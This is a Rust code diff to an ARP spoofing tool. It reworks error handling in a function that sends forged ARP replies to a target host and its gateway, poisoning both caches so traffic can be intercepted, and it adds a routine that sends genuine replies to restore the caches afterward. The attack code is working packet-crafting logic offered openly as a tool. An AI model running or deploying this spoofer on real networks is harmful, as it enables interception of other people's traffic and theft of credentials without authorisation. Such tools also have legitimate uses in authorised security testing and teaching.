@@ -111,11 +111,17 @@ impl ArpSpoofer {
     pub fn send_poisoned_req(&self) {
         let target_ip = match self.target_ip {
             IpAddr::V4(ipv4) => ipv4,
-            _ => panic!("Target IP is not IPv4"),
+            _ => {
+                eprintln!("[!] Target IP is not IPv4");
+                return;
+            }
         };
         let gateway_ip = match self.gateway_ip {
             IpAddr::V4(ipv4) => ipv4,
-            _ => panic!("Gateway IP is not IPv4"),
+            _ => {
+                eprintln!("[!] Gateway IP is not IPv4");
+                return;
+            }
         };
 
         let source_mac = array_to_mac(self.self_mac);
@@ -125,8 +131,14 @@ impl ArpSpoofer {
         // datalink channel
         let (mut tx, _) = match datalink::channel(&self.interface, Default::default()) {
             Ok(Ethernet(tx, rx)) => (tx, rx),
-            Ok(_) => panic!("Unhandled channel type"),
-            Err(e) => panic!("Failed to create datalink channel: {}", e),
+            Ok(_) => {
+                eprintln!("[!] Unhandled channel type");
+                return;
+            }
+            Err(e) => {
+                eprintln!("[!] Failed to create datalink channel: {}", e);
+                return;
+            }
         };
 
         // ARP reply to target
@@ -150,8 +162,8 @@ impl ArpSpoofer {
         }
 
         tx.send_to(&ethernet_buffer, Some(self.interface.clone()))
-            .expect("Failed to send ARP reply")
-            .unwrap();
+            .expect("Failed to send ARP reply to target")
+            .expect("Failed to send packet");
 
         // ARP reply to gateway
         let mut ethernet_buffer = [0u8; 42];
@@ -174,7 +186,86 @@ impl ArpSpoofer {
         }
 
         tx.send_to(&ethernet_buffer, Some(self.interface.clone()))
-            .expect("Failed to send ARP reply")
-            .unwrap();
+            .expect("Failed to send ARP reply to gateway")
+            .expect("Failed to send packet");
+    }
+
+    pub fn restore_arp_tables(&self) {
+        println!("[*] Restoring ARP tables (sending legitimate ARP packets)...");
+
+        let target_ip = match self.target_ip {
+            IpAddr::V4(ipv4) => ipv4,
+            _ => panic!("Target IP is not IPv4"),
+        };
+        let gateway_ip = match self.gateway_ip {
+            IpAddr::V4(ipv4) => ipv4,
+            _ => panic!("Gateway IP is not IPv4"),
+        };
+
+        let target_mac = array_to_mac(self.target_mac);
+        let gateway_mac = array_to_mac(self.gateway_mac);
+
+        let (mut tx, _) = match datalink::channel(&self.interface, Default::default()) {
+            Ok(Ethernet(tx, rx)) => (tx, rx),
+            Ok(_) => panic!("Unhandled channel type"),
+            Err(e) => panic!("Failed to create datalink channel: {}", e),
+        };
+
+        // Send restoration packets multiple times to ensure they're received
+        for i in 0..5 {
+            // Restore target's ARP cache (tell target the real gateway MAC)
+            let mut ethernet_buffer = [0u8; 42];
+            {
+                let mut eth_packet = MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();
+                eth_packet.set_destination(target_mac);
+                eth_packet.set_source(gateway_mac);
+                eth_packet.set_ethertype(EtherTypes::Arp);
+
+                let mut arp_packet = MutableArpPacket::new(eth_packet.payload_mut()).unwrap();
+                arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
+                arp_packet.set_protocol_type(EtherTypes::Ipv4);
+                arp_packet.set_hw_addr_len(6);
+                arp_packet.set_proto_addr_len(4);
+                arp_packet.set_operation(ArpOperations::Reply);
+                arp_packet.set_sender_hw_addr(gateway_mac);
+                arp_packet.set_sender_proto_addr(gateway_ip);
+                arp_packet.set_target_hw_addr(target_mac);
+                arp_packet.set_target_proto_addr(target_ip);
+            }
+
+            tx.send_to(&ethernet_buffer, Some(self.interface.clone()))
+                .expect("Failed to send restoration ARP reply")
+                .unwrap();
+
+            // tell gateway the real target MAC
+            let mut ethernet_buffer = [0u8; 42];
+            {
+                let mut eth_packet = MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();
+                eth_packet.set_destination(gateway_mac);
+                eth_packet.set_source(target_mac);
+                eth_packet.set_ethertype(EtherTypes::Arp);
+
+                let mut arp_packet = MutableArpPacket::new(eth_packet.payload_mut()).unwrap();
+                arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
+                arp_packet.set_protocol_type(EtherTypes::Ipv4);
+                arp_packet.set_hw_addr_len(6);
+                arp_packet.set_proto_addr_len(4);
+                arp_packet.set_operation(ArpOperations::Reply);
+                arp_packet.set_sender_hw_addr(target_mac);
+                arp_packet.set_sender_proto_addr(target_ip);
+                arp_packet.set_target_hw_addr(gateway_mac);
+                arp_packet.set_target_proto_addr(gateway_ip);
+            }
+
+            tx.send_to(&ethernet_buffer, Some(self.interface.clone()))
+                .expect("Failed to send restoration ARP reply")
+                .unwrap();
+
+            if i < 4 {
+                thread::sleep(Duration::from_millis(100));
+            }
+        }
+
+        println!("[+] Sent {} restoration packets", 5 * 2);
     }
 }
